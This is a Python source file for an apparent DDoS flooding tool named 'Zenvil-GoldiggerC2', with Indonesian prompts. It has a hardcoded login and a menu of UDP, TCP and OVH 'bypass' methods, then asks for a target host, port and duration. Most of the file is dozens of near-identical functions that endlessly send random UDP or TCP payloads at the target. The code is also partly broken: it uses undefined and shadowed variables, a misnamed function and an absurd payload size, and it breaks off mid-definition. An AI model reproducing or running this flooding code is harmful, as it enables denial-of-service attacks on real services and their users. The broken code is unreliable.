import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m

╔═╗┌─┐┌┐┌┬  ┬┬┬   ╔═╗┌─┐┬  ┌┬┐┬┌─┐┌─┐┌─┐┬─┐
╔═╝├┤ │││└┐┌┘││───║ ╦│ ││   ││││ ┬│ ┬├┤ ├┬┘
╚═╝└─┘┘└┘ └┘ ┴┴─┘ ╚═╝└─┘┴─┘─┴┘┴└─┘└─┘└─┘┴└─

""")

username = str(input("\033[94m[XAV2] \033[93mUsername:"))
password = str(input("\033[94m[XAV2] \033[93mPassword:"))
if password == "IvanDDoS" and username == "IvanDDoS":
    print ("Telah Masuk Sebagai Zenvil-GoldiggerC2")
    time.sleep(2)

else:
    print ("Password Yang Kamu Masukan Salah Bruh.")
    time.sleep(2)
    exit()

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.10)


nicknm = "IvanDDoS"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[94m

╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
║║║║╣  ║ ╠═╣║ ║ ║║║╣ 
╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝

""")
print("""\033[92m
| UDP             |     TCP-BYPASSED            |
| OVH             |     UDP-BYPASSED           |
| UDP-DOWN        |     BYPASSEDV2           |
| TCP             |
| BYPASSED             |
| OVH-BYPASSED             |
| TCP-DOWN             |
| OVH-DOWN            |
———————————————————
""")

ip = str(input("\033[91m====> Masukan Host/IP Target   : "))
port = int(input("\033[91m====> Masukan Port Target  : "))
time = int(input("\033[91m====> Masukan Jumlah Time Server   : "))
threads = int(input("\033[91m====> Maskan Jumlah Packet Server   : "))
choice = str(input("\033[91m====> Masukan Methods Tools   : "))

os.system("clear")

def run():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run2():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run3():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run4():
	data = random._urandom(910910)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run5():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run6():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run7():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run8():
	data = random._urandom(567891)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run9():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run10():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run11():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run12():
	data = random._urandom(1236778)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run13():
	data = random._urandom(134467)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run14():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run15():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run16():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run17():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run18():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run19():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run20():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run21():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run22():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run23():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run24():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run25():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run26():
	data = random._urandom(9191101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run27():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run28():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run29():
	data = random._urandom(567891)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run30():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run31():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run32():
	data = random._urandom(9696)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run33():
	data = random._urandom(1236778)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run34():
	data = random._urandom(134467)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run35():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run36():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run37():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run38():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run39():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run40():
	data = random._urandom(5353535353567891015353535399999)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run41():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run42():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run43():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def ru44():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run45():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run46():
	data = random._urandom(910910)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run47():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run48():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run49():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run50():
	data = random._urandom(567891)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run51():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run52():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run53():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run54():
	data = random._urandom(1236778)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run55():
	data = random._urandom(134467)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run56():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run57():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run58():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run59():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run60():
	data = random._urandom(5353)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run61():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run62():
	data = random._urandom(56789101)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))

def run63():
    data = random._urandom(65535)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
        except:
            s.close()
            print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
            
def run64():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run65():
	data = random._urandom(9191)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run66():
	data = random._urandom(65534)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
		except:
			print("\033[91m[•] Attack To \033[97m{} \033[91mPort \033[91m{}".format(ip,port))
			
def run67():
